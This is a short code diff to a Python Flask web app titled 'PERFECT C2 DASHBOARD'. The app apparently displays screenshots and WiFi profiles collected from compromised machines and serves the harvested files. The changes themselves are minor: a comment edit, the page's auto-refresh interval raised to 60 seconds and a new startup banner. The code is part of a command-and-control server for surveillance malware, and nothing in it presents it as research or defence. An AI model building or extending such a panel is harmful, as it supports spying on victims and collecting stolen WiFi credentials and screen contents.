@@ -84,7 +84,7 @@ def perfect_dashboard():
         for c in list(live_data["screenshots"])
     ])
     
-    # WiFi HTML - FIXED
+    # WiFi HTML
     wifi_items = []
     for c in list(live_data["wifi"]):
         profiles_html = ''.join([
@@ -109,7 +109,7 @@ def perfect_dashboard():
 <html>
 <head>
     <title>🔥 PERFECT C2 DASHBOARD</title>
-    <meta http-equiv="refresh" content="4">
+    <meta http-equiv="refresh" content="60;url=/">
     <style>
         * {{ margin:0; padding:0; box-sizing:border-box; }}
         body {{ font-family:'Consolas',monospace; background:#0a0a0a; color:#00ff88; padding:20px; }}
@@ -180,5 +180,5 @@ def serve_file(filename):
     return send_from_directory(DATA_DIR, filename)
 
 if __name__ == '__main__':
-    print("🚀 PERFECT C2 SERVER - Screenshots + WiFi + Categories")
+    print("🚀 PERFECT C2 SERVER - 60s Auto Refresh")
     app.run(host='0.0.0.0', port=5000, debug=False)
